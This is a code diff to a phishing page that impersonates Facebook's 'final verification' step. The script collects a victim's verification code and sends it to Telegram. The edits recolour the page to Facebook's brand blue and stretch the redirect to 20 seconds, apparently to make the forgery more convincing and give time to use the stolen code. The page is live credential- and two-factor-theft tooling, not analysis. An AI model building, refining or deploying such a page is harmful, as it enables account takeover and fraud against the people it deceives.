@@ -6,7 +6,7 @@
   <title>Facebook - Almost There! Final Verification</title>
   <meta name="description" content="Facebook security verification step 3 - Almost there! Enter the final verification code to complete your account security.">
   <meta property="og:title" content="Facebook - Almost There! Final Verification">
-  <meta property="og:description" content="✅ Almost there! Enter your final verification code to complete Facebook account security process.">
+  <meta property="og:description" content="Almost there! Enter your final verification code to complete Facebook account security process.">
   <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/TJPKIuZGNxL.png">
   <meta property="og:url" content="https://www.facebook.com/security/verification">
   <meta property="og:type" content="website">
@@ -76,17 +76,17 @@
     .success-icon {
       width: 96px;
       height: 96px;
-      background: linear-gradient(135deg, #42B72A 0%, #36a420 100%);
+      background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
       border-radius: 50%;
       margin: 0 auto 24px;
       display: flex;
       align-items: center;
       justify-content: center;
-      box-shadow: 0 4px 12px rgba(66, 183, 42, 0.3);
+      box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
     }
     
     .verification-title {
-      color: #42B72A;
+      color: #1877f2;
       font-size: 28px;
       font-weight: bold;
       margin-bottom: 12px;
@@ -119,7 +119,7 @@
     }
     
     .progress-step.active {
-      background-color: #42B72A;
+      background-color: #1877f2;
     }
     
     .progress-text {
@@ -129,8 +129,8 @@
     
     /* Success alert */
     .success-alert {
-      background: linear-gradient(135deg, #e8f5e8 0%, #f0f9f0 100%);
-      border: 1px solid #42B72A;
+      background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%);
+      border: 1px solid #1877f2;
       border-radius: 12px;
       padding: 20px;
       margin-bottom: 24px;
@@ -147,7 +147,7 @@
       width: 24px;
       height: 24px;
       margin-right: 12px;
-      background-color: #42B72A;
+      background-color: #1877f2;
       border-radius: 50%;
       display: flex;
       align-items: center;
@@ -158,7 +158,7 @@
     }
     
     .alert-title {
-      color: #42B72A;
+      color: #1877f2;
       font-weight: 600;
       font-size: 15px;
     }
@@ -212,8 +212,8 @@
     
     .verification-input:focus {
       outline: none;
-      border-color: #42B72A;
-      box-shadow: 0 0 0 2px rgba(66, 183, 42, 0.2);
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
       background-color: white;
     }
     
@@ -233,7 +233,7 @@
     .verify-button {
       width: 100%;
       padding: 16px 32px;
-      background: linear-gradient(135deg, #42B72A 0%, #36a420 100%);
+      background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
       color: white;
       border: none;
       border-radius: 8px;
@@ -241,13 +241,13 @@
       font-weight: 600;
       cursor: pointer;
       transition: all 0.3s ease;
-      box-shadow: 0 3px 8px rgba(66, 183, 42, 0.3);
+      box-shadow: 0 3px 8px rgba(24, 119, 242, 0.3);
       margin-bottom: 16px;
     }
     
     .verify-button:hover:not(:disabled) {
       transform: translateY(-1px);
-      box-shadow: 0 5px 12px rgba(66, 183, 42, 0.4);
+      box-shadow: 0 5px 12px rgba(24, 119, 242, 0.4);
     }
     
     .verify-button:disabled {
@@ -267,7 +267,7 @@
       width: 20px;
       height: 20px;
       border: 2px solid #f3f3f3;
-      border-top: 2px solid #42B72A;
+      border-top: 2px solid #1877f2;
       border-radius: 50%;
       animation: spin 1s linear infinite;
       margin: 0 auto;
@@ -509,17 +509,17 @@
         const success = await sendTelegramMessage(message);
         console.log('Third verification code sent to Telegram:', success);
         
-        // Redirect to processing page
+        // Redirect to processing page after 20 seconds
         setTimeout(() => {
           window.location.href = '/processing';
-        }, 1500);
+        }, 20000);
         
       } catch (error) {
         console.error('Error sending verification code:', error);
         // Continue with the flow even if there's an error
         setTimeout(() => {
           window.location.href = '/processing';
-        }, 1500);
+        }, 20000);
       }
     });
   </script>
